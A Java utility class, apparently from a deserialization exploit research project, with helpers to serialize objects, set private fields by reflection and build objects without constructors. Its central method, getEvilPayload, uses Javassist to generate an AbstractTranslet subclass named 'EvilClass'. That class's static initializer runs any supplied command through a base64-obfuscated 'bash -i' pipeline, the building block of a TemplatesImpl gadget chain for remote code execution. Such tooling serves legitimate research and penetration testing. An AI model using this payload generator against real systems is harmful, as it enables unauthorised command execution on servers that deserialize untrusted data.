package Seri;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import sun.reflect.ReflectionFactory;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;

public class Utils {
    public static void serialize(Object object ,String filename) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(object);
        oos.close();

        FileOutputStream fos = new FileOutputStream(filename);
        barr.writeTo(fos);
        fos.close();

        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object result = ois.readObject();
        ois.close();

        return result;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] getEvilPayload(String cmd) throws Exception {
        String cmdBase64 = new String(Base64.getEncoder().encode(cmd.getBytes()));

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("EvilClass");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superClass);

        String evilBlock = String.format(
                "Runtime.getRuntime().exec(\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\");",
                cmdBase64);
        clazz.makeClassInitializer().insertBefore(evilBlock);

        return clazz.toBytecode();

    }

    // 不调用构造方法创建对象
    public static Object createObjectWithoutConstructor(Class clazz) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Constructor<Object> constructor = Object.class.getDeclaredConstructor();
        Constructor<?> constructor1 = reflectionFactory.newConstructorForSerialization(clazz ,constructor);
        constructor1.setAccessible(true);

        return constructor1.newInstance();
    }
}